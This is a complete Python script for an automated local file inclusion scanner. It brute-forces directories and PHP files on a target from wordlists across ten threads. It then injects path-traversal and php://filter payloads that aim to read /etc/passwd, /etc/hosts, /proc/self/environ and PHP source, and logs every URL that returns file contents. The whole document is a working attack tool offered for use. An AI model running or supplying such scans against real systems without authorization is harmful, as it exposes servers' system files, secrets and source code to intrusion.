import requests
import threading
import queue
import argparse

# Argument Parser
parser = argparse.ArgumentParser(description="Auto LFI Scanner")
parser.add_argument("url", help="Target URL (e.g., http://example.com)")
args = parser.parse_args()

# Configuration
TARGET_URL = args.url.rstrip('/')  # Ensure no trailing slash
DIR_WORDLIST = "dir.txt"
QUERY_WORDLIST = "query.txt"
LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../etc/hosts",
    "../../../../../../proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
]

# Load wordlists
def load_wordlist(filename):
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip()]

directories = load_wordlist(DIR_WORDLIST)
query_params = load_wordlist(QUERY_WORDLIST)

# Queue for threading
task_queue = queue.Queue()

# Function to check if a directory or PHP file exists
def check_path(path):
    url = f"{TARGET_URL}/{path}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print(f"[+] Found: {url}")
            if path.endswith(".php"):
                test_lfi(path)  # Call LFI testing immediately if it's a PHP file
            return True
    except requests.RequestException as e:
        print(f"[-] Request failed for {url}: {e}")
    return False

# Function to test for LFI
def test_lfi(target_path):
    for param in query_params:
        for payload in LFI_PAYLOADS:
            test_url = f"{TARGET_URL}/{target_path}?{param}={payload}"
            print(f"[*] Testing: {test_url}")  # Print every tested URL
            try:
                response = requests.get(test_url, timeout=5)
                if "root:x:" in response.text or "<?php" in response.text:
                    print(f"[!!!] LFI Found: {test_url}")
                    with open("lfi_results.txt", "a") as log_file:
                        log_file.write(f"LFI Found: {test_url}\n")
            except requests.RequestException as e:
                print(f"[-] Failed to test LFI for {test_url}: {e}")

# Worker function for threading
def worker():
    while not task_queue.empty():
        task = task_queue.get()
        check_path(task)  # Directly check paths and test LFI if PHP file is found
        task_queue.task_done()

# Populate the task queue
for dir_name in directories:
    task_queue.put(dir_name)
    task_queue.put(f"{dir_name}.php")

# Start worker threads
threads = []
for _ in range(10):  # Adjust the number of threads as needed
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# Wait for all threads to finish
task_queue.join()

print("[+] LFI Scan Complete!")
